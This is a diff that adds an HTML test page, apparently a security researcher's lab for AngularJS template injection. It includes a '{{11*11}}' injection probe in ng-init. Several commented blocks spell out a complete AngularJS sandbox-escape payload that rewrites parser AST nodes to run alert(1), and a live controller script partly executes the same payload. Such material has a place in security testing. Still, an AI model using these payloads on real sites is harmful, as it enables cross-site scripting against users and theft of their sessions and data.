@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<!-- <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.9/angular.min.js"></script> -->
+<script src="./angularjs.js"></script>
+
+<body ng-app="myApp">
+    <div ng-controller="myCtrl" ng-init="myFunc('{{11*11}}wtf',2,3,4)">
+        <p>Click the button to wtff a function:</p>
+        <!-- <button ng-click="myFunc('1337')">OK</button> -->
+        <p>The button has been clicked {{count}} times.</p>
+        <!--  <p>haha {{verificationData}}</p> -->
+        <!-- {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+        c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+        $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+        C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+        B=C(b,c,b);$evalAsync("
+        astNode=pop();astNode.type='UnaryExpression';
+        astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+        astNode.argument={type:'Identifier',name:'foo'};
+        ");
+        m1=B($$asyncQueue.pop().expression,null,$root);
+        m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+        $eval('a(b.c)');[].push.apply=a;
+        }} -->
+        <!-- {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;$root.h1='UnaryExpression';$root.h2='(window.X?void0:(window.X=true,alert(1)))+';$root.h3='Identifier';$root.h4='foo';B=C(b,c,b);$evalAsync('astNode=pop();astNode.type=$root.h1;astNode.operator=$root.h2;astNode.argument={type:$root.h3,name:$root.h4};');m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}} -->
+        <br>
+        <br>
+        <!-- {{call=''.sub.call;
+bind=''.sub.bind;
+apply=''.sub.apply;
+call.$apply = $apply;
+call.$eval = bind;
+oldphase = $$phase;
+$$phase = null;
+olddigest = $digest;
+$digest = ({}).toString;
+CALL=call.$apply(call);
+$$phase = oldphase;
+$digest = olddigest;
+BIND=CALL(bind, call, bind);
+$evalAsync("
+  astNode = pop();
+  astNode.type = 'UnaryExpression';
+  astNode.operator =
+    '(window.DONE ? void 0 : (window.DONE=true,alert(window)))+';
+  astNode.argument = {type: 'Identifier', name: 'foo'};
+");
+manipulate_ast_node_array_in_arg1 =
+  BIND($$asyncQueue.pop().expression, null, $root);
+manipulate_ast_node_array_in_arg2 =
+  BIND(CALL, null, manipulate_ast_node_array_in_arg1);
+[].push.apply = manipulate_ast_node_array_in_arg2;
+a = ''.sub;
+$eval('a(b.c)');
+[].push.apply = apply;
+}} -->
+        <!-- {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;$root.h1='UnaryExpression';$root.h2='(window.X?void0:(window.X=true,alert(1))) ';$root.h3='Identifier';$root.h4='foo';B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type=$root.h1;astNode.operator=$root.h2;astNode.argument={type:$root.h3,name:$root.h4};\");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}} -->
+    </div>
+    <script>
+    angular.module('myApp', [])
+        .controller('myCtrl', ['$scope', function($scope) {
+                $scope.count = 'a';
+                $scope.verificationData = 'b'
+                // $scope.myFunc = function(a,b) {
+                //   $scope.count = a;
+                // };
+
+
+                // c = ''.sub.call;
+                // b = ''.sub.bind;
+                // a = ''.sub.apply;
+                // c.$apply = $scope.$apply;
+                // c.$eval = b;
+                // op = $scope.$$phase;
+                // $scope.$$phase = null;
+                // od = $scope.$digest;
+                // $scope.$digest = ({}).toString;
+                // C = c.$apply(c);
+                // $scope.$$phase = op;
+                // $scope.$digest = od;
+                // B = C(b, c, b);
+                // $scope.$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator = '(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument = { type: 'Identifier', name: 'foo' };");
+                // exp = $scope.$$asyncQueue.pop().expression
+
+                $scope.$applyAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator = '(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument = { type: 'Identifier', name: 'foo' };");
+                exp = $scope.$$applyAsyncQueue.pop().expression
+                console.log($scope.applyAsyncExpression)
+                    // $scope.myFunc = function(verificationData, connectsData, isEligibleForIdvLimitedAdmission, isJobSaved) {
+                    //     $scope.verificationData = verificationData,
+                    //         connects = connectsData,
+                    //         // $scope.updateJobSavedStatus(),
+                    //         $scope.isEligibleForIdvLimitedAdmission = isEligibleForIdvLimitedAdmission,
+                    //         $scope.count = isJobSaved
+                    // }
+                }]);
+    </script>
+</body>
+
+</html>
